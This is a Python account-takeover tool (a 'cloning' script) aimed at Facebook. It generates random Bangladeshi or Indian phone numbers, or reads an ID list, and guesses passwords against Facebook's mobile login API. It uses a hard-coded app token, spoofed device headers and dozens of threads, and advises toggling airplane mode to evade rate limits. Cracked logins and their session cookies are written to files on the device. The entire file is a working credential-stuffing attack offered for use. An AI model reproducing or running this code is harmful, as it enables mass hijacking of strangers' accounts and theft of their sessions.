#-------------------------( IMPORT)-------------------------#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
try:
    import requests
except ImportError:
    print(f'\n\x1b[1;97m[=] INSTALLING REQUESTS ')
    time.sleep(0.5)
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n\x1b[1;97m[=] INSTALLING FUTURES ')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n\x1b[1;97m[=] INSTALLING BS4 ')
    time.sleep(0.5)
    os.system('pip install bs4')
#-------------------------( RANDOM-UP-MODEL )-------------------------#
#fbks = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
#AMSS1 = random.choice(['MessengerLite', 'FB4A;FBAV', 'FB4A'])
AMSS2 = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])


#-------------------------( COLOUR )-------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
#-------------------------( LOOP )-------------------------#
loop = 0;oks = [];cps = [];id = []
#-------------------------( LINE )-------------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{Y}─────────────────────────────────────────────')
#-------------------------( LOGO )-------------------------#
os.system("xdg-open https://facebook.com/groups/354128088574524/")
logo = f"""
\033[1;32m03388888b.  .d88888b.  888b    888 
\033[1;32m888  "Y88b d88P" "Y88b 8888b   888 
\033[1;32m888    888 888     888 88888b  888 
\033[1;31m888    888 888     888 888Y88b 888 
\033[1;31m888    888 888     888 888 Y88b888 
\033[1;32m888    888 888     888 888  Y88888 
\033[1;32m888  .d88P Y88b. .d88P 888   Y8888 
\033[1;32m8888888P"   "Y88888P"  888    Y888
{Y}─────────────────────────────────────────────{A}
[•]\033[1;37m AUTHOR       : \033[1;32m MD REJAUL KARIM{A}
[•]\033[1;37m TOOL STATUS  :\033[1;32m  PREMIUM{A}
[•]\033[1;37m TOOL VERSION : \033[1;32m 1.1.0{A}
[•]\033[1;37m CLONING MTHD : \033[1;32m FILE / RANDOM
{Y}─────────────────────────────────────────────"""
#-------------------------( MENU )-------------------------#
def menu():
    clear()
    print(f"{A}[1] FILE CLONING");print(f"{A}[2] RANDOM CLONING");print(f"{A}[3] JOIN WHATS APP GROUP");print(f"{A}[0] EXIT CLONING");linex();option = input(f'{A}[?] SELECT :{G} ')
    if option in ['A','1']:
        os.system("xdg-open https://www.facebook.com/md.rejaul.karim.63")
        __filexx__()
    elif option in ['B','2']:
        os.system("xdg-open https://www.facebook.com/md.rejaul.karim.63")
        __randmx__()
    elif option in ['C','3']:
        os.system("xdg-open https://chat.whatsapp.com/BNfQYHG6QvfKmwJxUtpetM")
    elif option in ['D','0']:exit()
    else:
        print(f'\n{A}[$] VALID OPTION ');menu()
#-------------------------( FILE-SYS )-------------------------#      
def __filexx__():
    clear()
    print(f"{A}[$] EXAMPLE : /sdcard/DON.txt ");linex()
    dfile = input(f'{A}[?] FILE NAME : ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{A}[$] FILE NOT FOUND...');time.sleep(1);__filexx__()
    dplist = []
    try:
        clear()
        pass_lmit = int(input(f'{A}[$] PASSWORD LIMIT : '))
    except:
        pass_lmit =1
    clear()
    print(f"{A}[$] EXAMPLE : firstlast/first123/first@@ ");print(f"{A}[$] EXAMPLE : 57273200/59039200/57575751 ");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{A}[$] PASSWORD NO.{i+1} :{G} '))
    with ThreadPool(max_workers=40) as donvai:
        clear();total_ids = str(len(dx))
        print(f"{A}[$] TOTAL ID :{G} {total_ids}");print(f"{A}[$] USE AIRPLANE MODE EVERY 5 MINTS");linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            donvai.submit(filemethodx,ids,names,passlist)
    print('');linex();print(f"{A}[$] CLONE COMPLETE BRO");print(f"{A}[$] TOTAL ID : {G}{len(oks)}");print(f"{A}[$] TOTAL CP : {Y}{len(cps)}");linex();exit()
#-------------------------( RANDOM )-------------------------#
def __randmx__():
    clear()
    print(f"{A}[1] BANGLADESH CLONING");print(f"{A}[2] INDIA CLONING");print(f"{A}[0] BACK MAIN MENU");linex();option = input(f'{A}[?] SELECT :{G} ')
    if option in ['A','1']:__bd__()
    elif option in ['B','2']:__India__()
    elif option in ['C','0']:menu()
    else:
        print(f'\n{A}[$] VALID OPTION ');__randmx__()
#-------------------------( RANDOM-BD-SYS)-------------------------#
def __bd__():
    user=[]
    clear()
    print(f"{A}[$] EXAMPLE : 017 | 018 | 019 | 016");linex();code = input(f"{A}[?] SELECT  :  ");clear();print(f"{A}[$] EXAMPLE : 3000 | 5000 | 9999 | 99999");linex();limit = int(input(f"{A}[?] SELECT  : "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=35) as donvai:
        clear();tl = str(len(user))
        print(f'{A}[$] SIM CODE :{G} {code} ');print(f'{A}[$] TOTAL ID :{G} {tl} ');print(f"{A}[$] USE AIRPLANE MODE EVERY 5 MINTS");linex()
        for love in user:
           ids = code+love
           ax = love[:6]
           bx = love[:7]
           cx = ids[:8]
           passlist = [love,ids,ax,bx,cx]
           donvai.submit(randmmethod,ids,passlist)
    print('');linex();print(f"{A}[$] CLONE COMPLETE BRO");print(f"{A}[$] TOTAL ID : {G}{len(oks)}");print(f"{A}[$] TOTAL CP : {Y}{len(cps)}");linex();exit()
#-------------------------( RANDOM-INDIA-SYS)-------------------------#
def __India__():
    user=[]
    clear()
    print(f"{A}[$] EXAMPLE : +91639 | +97852 | +93643 | +93747");linex();code = input(f"{A}[?] SELECT  :  ");clear();print(f"{A}[$] EXAMPLE : 3000 | 5000 | 9999 | 99999");linex();limit = int(input(f"{A}[?] SELECT  : "))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as donvai:
        clear();tl = str(len(user))
        print(f'{A}[$] SIM CODE :{G} {code} ');print(f'{A}[$] TOTAL ID :{G} {tl} ');print(f"{A}[$] USE AIRPLANE MODE EVERY 5 MINTS");linex()
        for love in user:
           ids = code+love
           passlist = ['57575752','india123','57575751','57273200','59039200',ids,love,ids[3:]]
           donvai.submit(randmmethod,ids,passlist)
    print('');linex();print(f"{A}[$] CLONE COMPLETE BRO");print(f"{A}[$] TOTAL ID : {G}{len(oks)}");print(f"{A}[$] TOTAL CP : {Y}{len(cps)}");linex();exit()
#-------------------------( FILE-METHOD )-------------------------#
def filemethodx(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{Y}[DON-VAIYA]{G} %s OK|{Y}CP {G}%s|{Y}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            ANDROID_VERSION=str(random.randint(4,8))+'.'+str(random.randint(0,8))+'.'+str(random.randint(0,8))
            ver=str(random.randint(286,886))+'.0.0.'+str(random.randint(11,88))+'.'+str(random.randint(122,422))
            #BUILD_VERSION=str(random.randint(00000000,99999999))
            fk=random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
            fvv=str(random.randint(00000000,99999999))
            FBL = random.choice(['cs_CZ','en_GB','en_US','lt_LT','pl_PL','id_ID','ru_RU','pt_PT','he_IL','hi_IN','nl_NL',' it_IT','en_IN','es_ES','en_PK'])
            head = {'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android {ANDROID_VERSION}; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/{ver};FBBV/{fvv};FBDM/{{density=3.0,width=1080,height=1776}};FBPN/{fk};FBLC/{FBL};FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/{ANDROID_VERSION};FBCA/armeabi-v7a:armeabi;]','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"275254692598279|585aec5b4c27376758abb7ffcb9db2af","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                print(f'\r\r{G}[DON-OK] '+ids+' | '+pas)
                oks.append(ids)
                open('/sdcard/DON-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                open('/sdcard/DON-FiLE-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[DON-CP] '+ids+f' | '+pas)
                open('/sdcard/DON-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#-------------------------( RANDOM-METHOD )-------------------------#
def randmmethod(ids,passlist):
    try:
        global oks,loop
        sys.stdout.write(f'\r\r{Y}[DON-XD]{G} %s OK|{Y}CP {G}%s|{Y}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        for pas in passlist:
            ANDROID_VERSION=str(random.randint(4,8))+'.'+str(random.randint(0,8))+'.'+str(random.randint(0,8))
            ver=str(random.randint(286,886))+'.0.0.'+str(random.randint(11,88))+'.'+str(random.randint(122,422))
            #BUILD_VERSION=str(random.randint(00000000,99999999))
            fk=random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
            fvv=str(random.randint(00000000,99999999))
            FBL = random.choice(['cs_CZ','en_GB','en_US','lt_LT','pl_PL','id_ID','ru_RU','pt_PT','he_IL','hi_IN','nl_NL',' it_IT','en_IN','es_ES','en_PK'])
            accessToken = "275254692598279|585aec5b4c27376758abb7ffcb9db2af"
            gtt = random.choice(AMSS2)
            #gttt = random.choice(AMSS2)
            fucked = f'[FBAN/Orca-Android;FBAV/{ver};FBBV/{fvv};FBDM/{{density=3.0,width=1080,height=1776}};FBPN/{fk};FBLC/{FBL};FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/{ANDROID_VERSION};FBCA/armeabi-v7a:armeabi;]'
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            data = {'adid':adid,'format':'json','device':gtt,'device_id':adid,'email':ids,'password':pas,"logged_out_id": str(uuid.uuid4()),"hash_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),"session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),'generate_analytics_claims':'1','credentials_type':'password','source':'login',"sim_country": "id","network_country": "id","relative_url": "method/auth.login",'error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1',"locale":"en_US","client_country_code":"US",'fb_api_req_friendly_name':'authenticate',"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head ={'Authorization':f'OAuth {accessToken}',"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','X-FB-device-group': str(random.randint(2000, 4000)),"X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice",'X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','X-FB-connection-quality':'EXCELLENT',"X-Tigon-Is-Retry": "False",'User-Agent': fucked,"X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded',"X-FB-Client-IP": "True","X-FB-Server-Cluster": "True",'X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                uid=str(q['uid'])
                lk_remove = f'https://graph.facebook.com/{uid}/picture?type=normal'
                baby = requests.get(lk_remove).text
                if 'Photoshop' in baby:
                    print(f'\r\r{A}[DON-OK] '+uid+' | '+pas+'\033[1;97m')
                    open('/sdcard/DON-RANDM-OK.txt','a').write(uid+'|'+pas+'\n')
                    oks.append(ids)
                    break
                else:pass
            elif 'www.facebook.com' in q['error_msg']:
                print(f'\r\r{Y}[DON-CP] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/DON-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
        
#-------------------------( END )-------------------------#     
menu()